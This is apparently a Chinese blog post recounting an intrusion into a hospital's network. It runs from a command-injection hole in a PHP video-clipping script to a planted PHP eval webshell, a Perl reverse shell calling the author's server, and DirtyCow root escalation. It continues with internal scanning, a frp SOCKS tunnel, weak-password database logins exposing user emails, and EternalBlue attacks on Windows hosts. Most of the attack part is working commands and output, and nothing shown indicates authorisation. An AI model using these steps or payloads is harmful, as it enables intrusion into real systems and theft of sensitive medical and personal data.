<p>看到成功执行命令。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接用exp打的没意思</p>
<p>但是ls之后我发现存在一个<a target="_blank" rel="noopener" href="http://www.tar网站备份的文件.于是我决定下载下来对这个漏洞进行研究/">www.tar网站备份的文件。于是我决定下载下来对这个漏洞进行研究</a></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213180055117.png" alt="image-20230213180055117"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213142620037.png" alt="image-20230213142620037"></p>
<p>直接找到漏洞触发的点，new_movie.php。</p>
<p>打开文件进行审计,关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$studyUID</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$start</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$end</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$file</span>) )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;studyUID: &#x27;</span>.<span class="variable">$studyUID</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;start: &#x27;</span>.<span class="variable">$start</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;end: &#x27;</span>.<span class="variable">$end</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;file: &#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$start_time</span> = gmdate(<span class="string">&quot;H:i:s&quot;</span>, <span class="variable">$start</span>);</span><br><span class="line">	<span class="variable">$duration_time</span> = gmdate(<span class="string">&quot;H:i:s&quot;</span>, <span class="variable">$end</span>-<span class="variable">$start</span>);	</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$output_file</span> = <span class="string">&#x27;/var/www&#x27;</span>.str_replace(<span class="string">&#x27;.mp4&#x27;</span>,<span class="string">&#x27;_&#x27;</span>.time().<span class="string">&#x27;.mp4&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;output: &#x27;</span>.<span class="variable">$output_file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$cmd</span> = <span class="string">&#x27;ffmpeg -ss &#x27;</span>.<span class="variable">$start_time</span>.<span class="string">&#x27; -t &#x27;</span>.<span class="variable">$duration_time</span>.<span class="string">&#x27; -vcodec copy -acodec copy -i /var/www&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$output_file</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	exec( <span class="variable">$cmd</span>.<span class="string">&#x27; 2&gt;&amp;1&#x27;</span>, <span class="variable">$output</span> );</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	print_r(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>首先是接收了这四个参数，<code>studyUID</code>,<code>start</code>,<code>end</code>,<code>file</code>。可以看到下面的cmd变量，代码中直接将接收到的参数拼接到output_file变量中了，虽然有个<code>str_replace</code>函数，但是并不影响，因为我们的<code>file</code>变量中没有.mp4去给函数进行替换，所以就直接将<code>file</code>拼接到<code>output_file</code>变量中了，<code>output_file</code>变量是放在cmd变量最后的，而且没有经过任何过滤传入exec函数中。</p>
<p>那么这个时候就可用linux分号来分割命令，实现rce。除了分号当然也可以用||，&amp;&amp;等等，但是分号是顺序地独立执行各条命令, 彼此之间不关心是否失败, 所有命令都会执行。</p>
<h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><p>我最开始拿到这样一个rce的时候，最先想到的是通过命令写入一句话木马，用哥斯拉或者是其他的webshell管理工具，方便后续的操作。</p>
<p><code>echo &#39;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#39; &gt;xiaomaomi.php</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213224258.png" alt="image-20230212213224258"></p>
<p>这里可以看到，我们的小猫咪木马确实是写进去了的。但是访问的时候却解析为500.</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213255376.png" alt="image-20230212213255376"></p>
<p>我尝试过使用市面上的一些简易免杀版本，同样为500。让我不得不怀疑，这个机器上面存在杀软。</p>
<p>而且我尝试访问过当前目录下的其他php文件，是确实解析了。</p>
<p>甚至cat也能看到文件中的内容</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213536297.png" alt="image-20230212213536297"></p>
<p>但是xiaomaomi就是不执行。我尝试过比较大的免杀马，但是却有url长度的限制，导致无法写入。</p>
<h2 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h2><p>当我无法上传木马的时候，我的思路是反弹一个会话，不管是nc也好，msf也好。我都可以更方便的操作。</p>
<p>于是开启了我的花生壳对我的kali虚拟机进行了一个内网穿透，开了个nc监听。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220132263.png" alt="image-20230212220132263"></p>
<p>但是都没有什么实质性的进展，最后那个whoami是我用自己的服务器实验了一下内网穿透，就是酱紫。</p>
<p>我把几乎能用到的反弹shell的命令几乎都用上了，就是弹不回来</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220453965.png" alt="image-20230212220453965"></p>
<p>我怀疑也是防火墙的出网策略或者是杀软搞的鬼。（后来我想可能是php函数的问题，有知道的师傅可以解释一波）</p>
<p>尝试pingdnslog，确定机器确实是出网的</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220928123.png" alt="image-20230212220928123"></p>
<h2 id="尝试3（成功）"><a href="#尝试3（成功）" class="headerlink" title="尝试3（成功）"></a>尝试3（成功）</h2><p>思路回到了上传木马的地方，我不能肯定是不是这些webshell的问题，既然命令写不进去，那我们就放到vps上让服务器去主动下载。</p>
<p>那我们拿自己的vps开一个http服务。</p>
<p>这边开http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install python3 python3-pip</span><br><span class="line">pip3 install simplefileserver</span><br><span class="line">simplefileserver 8989 </span><br><span class="line">随后访问你的vps的8989端口就可以</span><br></pre></td></tr></table></figure>

<p>然后wget上传大马</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212222541392.png" alt="image-20230212222541392"></p>
<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><p>既然是一个医院的系统，我想应该会有内网吧。</p>
<p>不管是不是内网，我们现在的权限还不是root</p>
<p>先看看这个机器的内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux ecsprod-oldbackup 3.2.0-4-amd64 #1 SMP Debian 3.2.57-3+deb7u1 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">是3.2.0-4-amd64</span><br></pre></td></tr></table></figure>

<p>而且我还扫了一下这儿ip的端口，发现22端口居然没开，我本来打算加密钥直接上ssh的，没开22就算了吧，还是先弹个shell回来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;vpsip&quot;;$p=35932;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<p>msf打开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  cmd/unix/reverse_bash</span><br><span class="line">set lport  7777</span><br><span class="line">set lhost  172.16.1.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>这次用大妈就弹成功了(我试过的，只有大妈能弹，用之前rce漏洞弹不了)，再次给kali内网穿透，得到一个msf会话。</p>
<p>我看这个版本的linux应该是可以用脏牛的，现在就试试</p>
<p>这是github上面脏牛的exp</p>
<p><code>https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c</code></p>
<p>直接给他wget到tmp目录下面</p>
<p>然后编译<code>gcc -pthread dirty.c -o dirty -lcrypy</code></p>
<p>但是编译的时候，提示没有相关动态库，而且，我还发现了一个问题。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213000743643.png" alt="image-20230213000743643"></p>
<p>上面是提示没有动态库，于是决定换一个exp</p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>换了个exp，顺便用nc在我的vps上弹了个会话（msf有点卡）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提前换成交互式shell</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004422893.png" alt="image-20230213004422893"></p>
<p><code>wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c</code></p>
<p><code>gcc -pthread dirty.c -o dirty -lcrypt</code>编译一下</p>
<p><code>./dirty 123456</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004538455.png" alt="image-20230213004538455"></p>
<p>等待提权成功</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004917209.png" alt="image-20230213004917209"></p>
<p>提权成功了！</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213005306922.png" alt="image-20230213005306922"></p>
<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="资产探测"><a href="#资产探测" class="headerlink" title="资产探测"></a>资产探测</h3><p>暂且不管是不是虚拟机，我们arp -a看看</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213172555433.png" alt="image-20230213172555433"></p>
<p>貌似还有4台机器啊</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">也就是说这个网段里面加上我拿下的这台机器，一共有5台机器</span><br><span class="line">本机192.168.1.70</span><br><span class="line"></span><br><span class="line">另外三台</span><br><span class="line">? (192.168.1.206) at 00:11:32:eb:41:08 [ether] on eth0</span><br><span class="line">? (192.168.1.111) at 00:11:32:ee:80:15 [ether] on eth0</span><br><span class="line">? (192.168.1.105) at 00:0c:29:31:da:67 [ether] on eth0</span><br><span class="line">DSR-1000AC (192.168.1.1) at f0:b4:d2:23:d3:67 [ether] on eth0</span><br><span class="line">（其中105是第二天出现的，第一天我没看到）</span><br></pre></td></tr></table></figure>

<p>这里我顺便看了看，这个名为DSR-1000AC的机器是路由器。（找了一下没发现路由器的漏洞）</p>
<p>这里先进行存活网段的探测,使用的工具名为netspy，github上面搜得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./netspy</span><br><span class="line">./netspy -x is #注：急速模式协程数量为cpu核数*40，只探测段内网关。</span><br></pre></td></tr></table></figure>

<p>以下是扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./netspy -x is</span><br><span class="line">[INFO] 2023/02/13 11:40 use icmp protocol to spy</span><br><span class="line">[INFO] 2023/02/13 11:40 192.168.0.0/16 is from 192.168.0.0 to 192.168.255.255</span><br><span class="line">[INFO] 2023/02/13 11:40 172.16.0.0/12 is from 172.16.0.0 to 172.31.255.255</span><br><span class="line">[INFO] 2023/02/13 11:40 10.0.0.0/8 is from 10.0.0.0 to 10.255.255.255</span><br><span class="line">2023/02/13 11:40 192.168.1.1/24</span><br><span class="line">2023/02/13 11:40 192.168.0.1/24</span><br><span class="line">2023/02/13 11:40 192.168.5.1/24</span><br><span class="line">2023/02/13 11:40 192.168.215.1/24</span><br></pre></td></tr></table></figure>

<p>大概也就是这四个存活网段<code>1\0\5\215</code></p>
<p>然后上fscan，开扫。（由于爆破ftp服务会让fscan卡住，我们就不要爆破ftp了）这些服务的密码我后续来爆破。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.1.1/24 -nobr -o 1.txt</span><br><span class="line">./fscan_amd64 -h 192.168.0.1/24 -nobr -o 0.txt</span><br><span class="line">./fscan_amd64 -h 192.168.5.1/24 -nobr -o 5.txt</span><br><span class="line">./fscan_amd64 -h 192.168.215.1/24 -nobr -o 215.txt</span><br></pre></td></tr></table></figure>

<p>拿到输出结果之后，我们用这个工具优化一下输出结果。<code>fscanOutput</code></p>
<p>扫描结果大致如下，因为我们使用了nobr参数，就导致了不会检测漏洞，我之前扫的时候检测到了ms17010,但是因为爆破ftp卡住了。</p>
<p>后面我们单独列一个表来给fscan跑，之前跑的大部分如下</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215105594.png" alt="image-20230213215105594"><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215111766.png" alt="image-20230213215111766"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215121812.png" alt="image-20230213215121812"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215136148.png" alt="image-20230213215136148"></p>
<p>那其他网段我们暂且不看，我们看看1这个网段的机器。</p>
<p>而且经过观察还可以发现，一共有3个域<code>WORKGROUP,MYGROUP,__MSBROWSE__</code></p>
<p>然后我们把这些机器的ip导到txt中，穿上去再用fscan扫一遍</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215826502.png" alt="image-20230213215826502"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -hf ta.txt -o all.txt</span><br></pre></td></tr></table></figure>

<p>大概扫描结果如下</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213224256897.png" alt="image-20230213224256897"></p>
<p>二十多台机器，我觉得有两种可能，一种是医院是小医院，一种是这个网里面只有他们对外的服务，没有内部办公电脑。因为我看了一下内部url的title有什么放射学信息系统，还有些其他的，</p>
<h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>首先我们需要将流量代理出来</p>
<p>我们采用frp，先把frpc传到对面这台机器上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的攻击机</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"># 启用加密，防止流量被拦截</span><br><span class="line">use_encryption = true</span><br><span class="line"># 启用压缩，提升流量转发速度</span><br><span class="line">use_compression = true</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>

<p><code>./frpc -c frpc.ini</code>开启服务</p>
<p>然后自己的vps上，也传个frps上去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vps_ip</span><br><span class="line">server_port = 4444</span><br></pre></td></tr></table></figure>

<p><code>./frps -c frps.ini</code>开启服务，注意现在的socket代理的ip为vps，但是端口为1080</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011120522.png" alt="image-20230214011120522"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011226576.png" alt="image-20230214011226576"></p>
<p>搭建成功！</p>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>一共探测到3个数据库</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120834713.png" alt="image-20230214120834713"></p>
<p>其中两个是有弱口令的，而78这台机器，提示如下，我们可以拿下其他机器之后再来试试</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120725755.png" alt="image-20230214120725755"></p>
<p>另外两个数据，我们是可以直接用fscan扫出来的弱口令登录的。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120934733.png" alt="image-20230214120934733"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121014276.png" alt="image-20230214121014276"></p>
<p>可以发现里面还是有很多数据的</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121120392.png" alt="image-20230214121120392"></p>
<p>只不过密码被加密了，但是却有邮箱等信息</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121203058.png" alt="image-20230214121203058"></p>
<p>都是法语看不太懂</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121416784.png" alt="image-20230214121416784"></p>
<h3 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h3><h4 id="尝试1-1"><a href="#尝试1-1" class="headerlink" title="尝试1"></a>尝试1</h4><p>先给各个机器扫了下弱口令</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214132424369.png" alt="image-20230214132424369"></p>
<p>可惜登录不上，原因未知</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214122437992.png" alt="image-20230214122437992"></p>
<p>先拿下这几台ms17-010好吧</p>
<p>先给kali连上我们的隧道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">改好下方的代理地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.1.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214152912193.png" alt="image-20230214152912193"></p>
<p>但是没有成功返回会话，或许是win5的原因，我们先攻击那台win7的机器。</p>
<p><code>192.168.1.51</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214153404421.png" alt="image-20230214153404421"></p>
<p>等待利用成功。很好，又失败了，<code>Exploit completed, but no session was created.</code></p>
<p>推测目标机器不出网，使用<code>set payload windows/x64/meterpreter/bind_tcp</code>这个paload正向打</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217225542792.png" alt="image-20230217225542792"></p>
